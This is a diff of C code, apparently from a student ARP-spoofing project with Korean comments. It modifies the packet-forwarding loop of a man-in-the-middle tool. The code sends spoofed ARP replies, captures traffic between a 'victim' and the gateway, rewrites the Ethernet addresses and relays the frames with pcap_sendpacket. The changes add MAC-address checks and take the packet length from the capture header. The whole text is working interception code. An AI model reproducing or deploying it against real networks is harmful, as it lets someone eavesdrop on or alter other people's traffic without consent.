@@ -383,7 +383,7 @@ int main(int argc, char* argv[]) {
 					sendPacket(fp, ARP_REPLY_TYPE, &sess[i]);													//변조패킷 전송
 			}
 		}
-		else if(next_packet[12] == 0x08 && next_packet[13] == 0x00 && next_packet[23] == 0x01){				//ip packet임을 확인																				//아니라면, victim-gateway 통신인지 확인하고 포워딩
+		else {//if(next_packet[12] == 0x08 && next_packet[13] == 0x00){				//ip packet임을 확인																				//아니라면, victim-gateway 통신인지 확인하고 포워딩
 			//packet forwarding
 			//victim-attacker send_mac 내거 send_ip gateway거 destination_mac, ip는 victim거
 			//gateway-attacker send_mac 내거 send_ip victim거 destination_mac, ip는 gateway거
@@ -411,14 +411,13 @@ int main(int argc, char* argv[]) {
 			//printf("\n\nicmp is captured\n\n");
 			//printPacket(next_packet, (next_packet[16] << sizeof(u_char)) + next_packet[17] + 14);
 			//getchar();
-			if (!memcmp(next_packet + 26, sess[0].destination_ip.ip, IPV4_LEN)) {
-				int packet_len = (next_packet[16] << sizeof(u_char)) + next_packet[17] + 14;
+			//if문 검사시 mac 검사 추가
+			if (!memcmp(next_packet + 26, sess[0].destination_ip.ip, IPV4_LEN) && !memcmp(next_packet + 6, sess[0].destination_mac.mac, MAC_LEN) && !memcmp(next_packet, my_mac.mac,MAC_LEN)) {
+				int packet_len = h->len;
 				memcpy(forwarding, next_packet, packet_len);
 				memcpy(forwarding + 6, my_mac.mac, MAC_LEN);
 				memcpy(forwarding, sess[1].destination_mac.mac, MAC_LEN);
-//				memcpy(forwarding + 26, my_ip.ip, IPV4_LEN);
 				pcap_sendpacket(fp, forwarding, packet_len);
-				printPacket(forwarding, packet_len);
 			}
 			//sess[0]값 sender_ip 192.168.43.1 destination_ip 192.168.43.202
 			//sender_mac my_mac destination_mac victiom
@@ -428,12 +427,11 @@ int main(int argc, char* argv[]) {
 			//202, des[0]  1, des[1]
 			//random->victim. ip는 random(src, 26)->my_ip(dest, 30)이지만 mac은 gateway(src, 6)->my_mac(dest, 0)이다.
 			//따라서 my_mac(6)->victim_mac(0), random_ip(src, 26)->victim_ip(dest, 30)으로 수정.
-			else if (!memcmp(next_packet + 30, sess[0].destination_ip.ip, IPV4_LEN)) {
-				int packet_len = (next_packet[16] << sizeof(u_char)) + next_packet[17] + 14;
+			else if (!memcmp(next_packet + 30, sess[0].destination_ip.ip, IPV4_LEN) && !memcmp(next_packet + 6, sess[1].destination_mac.mac, MAC_LEN) && !memcmp(next_packet, my_mac.mac, MAC_LEN)) {
+				int packet_len = h->len;
 				memcpy(forwarding, next_packet, packet_len);
 				memcpy(forwarding + 6, my_mac.mac, MAC_LEN);
 				memcpy(forwarding, sess[0].destination_mac.mac, MAC_LEN);
-//				memcpy(forwarding + 30, sess[0].destination_ip.ip, IPV4_LEN);
 				pcap_sendpacket(fp, forwarding, packet_len);
 			}
 				/*
